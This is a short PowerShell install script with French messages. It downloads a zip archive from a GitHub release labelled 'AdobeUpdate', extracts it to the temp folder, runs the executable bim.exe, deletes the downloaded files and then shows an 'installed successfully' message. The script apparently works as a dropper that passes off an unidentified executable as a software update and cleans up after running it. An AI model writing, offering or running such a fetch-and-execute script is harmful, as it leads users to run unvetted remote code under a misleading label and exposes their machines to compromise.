# =========================
# install.ps1
# =========================
$zipUrl   = "https://github.com/jimbertclement/AdobeUpdate/releases/download/Win/bim25.zip"
$zipPath  = "$env:TEMP\bim25.zip"
$unzipDir = "$env:TEMP\bim25_unzipped"
$exeName  = "bim.exe"  # ⚠️ Exécutable mis à jour

Write-Host "Téléchargement de bim25.zip..."
try {
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
} catch {
    Write-Host "[ERREUR] Impossible de télécharger bim25.zip."
    exit 1
}

if (!(Test-Path $zipPath)) {
    Write-Host "[ERREUR] Fichier bim25.zip introuvable après téléchargement."
    exit 1
}

Write-Host "Décompression de bim25.zip..."
try {
    Expand-Archive -Path $zipPath -DestinationPath $unzipDir -Force
} catch {
    Write-Host "[ERREUR] Échec de la décompression."
    exit 1
}

if (!(Test-Path "$unzipDir\$exeName")) {
    Write-Host "[ERREUR] Fichier $exeName introuvable après décompression."
    exit 1
}

Write-Host "Exécution de $exeName..."
Start-Process "$unzipDir\$exeName" -Wait

# Nettoyage
Remove-Item $zipPath -Force
Remove-Item $unzipDir -Force -Recurse

# Afficher une MessageBox
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show("Logiciel installé avec succès!","Installation",[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Information)

Write-Host "Terminé."
